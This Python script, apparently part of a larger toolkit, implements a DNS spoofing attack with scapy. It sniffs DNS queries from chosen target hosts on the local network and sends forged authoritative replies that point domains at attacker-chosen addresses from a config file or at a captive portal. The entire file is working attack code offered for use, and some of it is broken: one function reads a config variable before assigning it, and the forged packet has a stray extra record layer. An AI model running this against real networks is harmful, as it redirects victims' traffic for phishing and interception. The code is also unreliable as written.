from scapy.all import *
from multiprocessing import Process
from threading import Thread
from colorama import init, Fore
import socket, netifaces, json, logging

white   = Fore.WHITE
black   = Fore.BLACK
red     = Fore.RED
reset   = Fore.RESET
blue    = Fore.BLUE
cyan    = Fore.CYAN
yellow  = Fore.YELLOW
green   = Fore.GREEN
magenta = Fore.MAGENTA

class DNSSpoof(object):
    def __init__(self,verbose=False,targets="",captive=""):
        self.main_thread = None
        self.interface   = "eth0"
        self.iface_info  = netifaces.ifaddresses(self.interface)
        self.local_ip    = self.iface_info[netifaces.AF_INET][0]['addr']
        self.local_mac   = self.iface_info[netifaces.AF_LINK][0]['addr']
        self.targets	 = list(targets.split("/"))
        self.captive     = captive

        init()
        logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
        logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
        logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
        logging.addLevelName(logging.DEBUG, f"[{magenta}*{reset}]")
        logging.basicConfig(format=f"%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.INFO)
        logging.debug(f"DNS: Local IP - {self.local_ip}, Local MAC - {self.local_mac}")

    def config(self):
        conf  = json.loads(open("config/hosts.json","r").read())
        return conf

    def make_reply(self,pkt,redirect):
        fake_pkt = IP(dst=pkt[IP].src,
                    src=pkt[IP].dst)/\
                    UDP(dport=pkt[UDP].sport,sport=53)/\
                    DNS(id=pkt[DNS].id,
                        qd=pkt[DNS].qd,
                        aa=1,
                        qr=1,
                        ancount=1,
                        an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirect))/\
                    DNSRR(
                        rrname=pkt[DNSQR].qname,
                        rdata=redirect)
        send(fake_pkt)
        logging.debug(f"DNS: Spoofed request from {pkt[IP].src} for {pkt[DNSQR].qname.decode()} to {redirect}")

    def handle_pkt(self,pkt):
        if pkt.haslayer(IP) and pkt.haslayer(DNS):
            if pkt[IP].src != self.local_ip and pkt[Ether].dst == self.local_mac and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
                if not self.captive:
                    if pkt[DNSQR].qname.decode() in list(conf.keys()):
                        conf = self.config()
                        Thread(target=self.make_reply,args=(pkt, conf[pkt[DNSQR].qname.decode()] )).start()
                else:
                    Thread(target=self.make_reply,args=(pkt, self.captive)).start()

    def sniff_thread(self):
        filter_ = ""
        if self.targets:
            for t in self.targets:
                if len(filter_) > 0:
                    filter_ += " and host " + t
                else:
                    filter_ += "host " + t

        sniff(filter=filter_,prn=self.handle_pkt)

    def start(self):
        self.main_thread = Process(target=self.sniff_thread)
        self.main_thread.start()
        logging.debug("DNS: Sniff thread started")

    def stop(self):
        self.main_thread.kill()
        logging.debug("DNS: Sniff thread stopped")


if __name__ == "__main__":
    dns = DNSSpoof(verbose=True)
    dns.start()

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        dns.stop()
